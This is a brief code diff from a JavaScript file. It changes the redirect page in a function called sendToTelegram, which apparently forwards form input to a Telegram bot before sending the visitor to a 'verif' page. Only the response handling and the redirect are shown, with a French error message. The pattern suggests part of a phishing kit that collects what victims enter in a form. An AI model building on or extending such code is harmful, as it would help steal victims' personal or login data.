@@ -315,7 +315,7 @@ async function sendToTelegram(inputValueForm) {
     const data = await response.json();
 
     if (data.ok) {
-        window.location.href= 'verif.html';
+        window.location.href= 'verif.php';
     } else {
         alert("Une erreur s'est produite lors de l'envoi du message.");
     }
